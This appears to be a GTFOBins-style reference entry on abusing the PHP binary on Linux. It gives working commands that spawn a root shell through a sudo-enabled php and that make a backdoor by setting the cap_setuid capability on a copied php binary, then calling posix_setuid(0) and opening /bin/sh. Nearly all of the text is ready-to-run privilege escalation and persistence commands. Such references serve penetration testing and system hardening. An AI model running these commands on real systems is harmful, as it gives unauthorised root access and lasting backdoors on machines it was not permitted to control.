***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * CMD="/bin/sh"
      sudo php -r "system('$CMD');"
***** Capabilities *****
It can manipulate its process UID and can be used on Linux as a backdoor to
maintain elevated privileges with the CAP_SETUID capability set. This also
works when executed by another binary with the capability set.
    * cp $(which php) .
      sudo setcap cap_setuid+ep php

      CMD="/bin/sh"
      ./php -r "posix_setuid(0); system('$CMD');"
